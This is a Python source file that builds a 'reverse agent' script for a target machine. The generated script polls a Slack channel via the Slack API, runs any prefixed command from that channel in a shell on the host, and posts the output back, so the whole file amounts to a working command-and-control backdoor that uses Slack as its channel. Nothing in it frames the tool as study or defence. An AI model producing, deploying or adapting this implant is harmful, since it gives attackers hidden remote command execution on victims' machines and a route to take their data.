#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Slack Socket Mode reverse agent (stdlib urllib — no slack-sdk on target)."""

from __future__ import annotations

import json


def build_slack_reverse_agent_script(
    bot_token: str,
    channel_id: str,
    client_id: str,
    command_prefix: str = "!ks",
    poll_interval: float = 3.0,
) -> str:
    return f'''
import json,subprocess,time,urllib.request
TOKEN={bot_token!r};CHAN={channel_id!r};CID={client_id!r};PFX={command_prefix!r}
POLL={float(poll_interval)}
seen=set()
def api(method,payload):
    req=urllib.request.Request(
        "https://slack.com/api/"+method,
        data=json.dumps(payload).encode(),
        headers={{"Authorization":"Bearer "+TOKEN,"Content-Type":"application/json"}},
        method="POST",
    )
    with urllib.request.urlopen(req,timeout=30) as r:
        return json.loads(r.read().decode())
def post(text):
    api("chat.postMessage",{{"channel":CHAN,"text":text}})
def run_cmd(cmd):
    try:
        p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)
        out=(p.stdout or "")+(p.stderr or "")
        return out or f"exit {{p.returncode}}\\n"
    except Exception as e:
        return str(e)
while True:
    try:
        data=api("conversations.history",{{"channel":CHAN,"limit":20}})
        for msg in reversed(data.get("messages") or []):
            ts=msg.get("ts")
            if not ts or ts in seen: continue
            seen.add(ts)
            text=str(msg.get("text") or "")
            parts=text.split(None,3)
            if len(parts)<4 or parts[0]!=PFX or parts[1]!="cmd" or parts[2]!=CID:
                continue
            cmd=parts[3].strip()
            if not cmd: continue
            out=run_cmd(cmd)
            post(f"{{PFX}} {{CID}} {{out[:3500]}}")
    except Exception:
        pass
    time.sleep(POLL)
'''
